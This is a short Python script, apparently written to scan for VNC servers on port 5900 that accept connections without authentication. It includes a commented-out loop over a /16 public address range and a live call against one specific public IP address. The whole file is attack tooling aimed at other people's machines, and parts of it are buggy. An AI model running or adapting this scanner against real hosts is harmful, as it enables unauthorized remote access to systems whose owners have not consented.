network = '189.100'
import socket
from struct import unpack

def exploit(host):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(5)
	try: 
		sock.connect((host, 5900))
	except socket.timeout:
		print ('.')
		return

	if not sock:
		print('.')
		return

	prot_ver = sock.recv(12)
	print('prot ver -> ' + prot_ver)
	#sock.send(prot_ver)

	sec_types = sock.recv(4)
	print('sec types -> ' + sec_types)

	hahaha = sock.recv(1)
	sock.send('\x01')

	hue = sock.recv(4)
	print(hue)
	if unpack('I', hue):
		print('#')
		return
	sock.send('\x01')
	print('client init')

	#if sv sends data we r in
	hue = sock.recv(4)
	if unpack('I', hue):
		print host

if __name__ == '__main__':
	"""
	for i in range(255):
		for j in range(255):
			host = '{0}.{1}.{2}'.format(network, i, j)
			exploit(host)
	"""
	exploit('189.103.109.208')
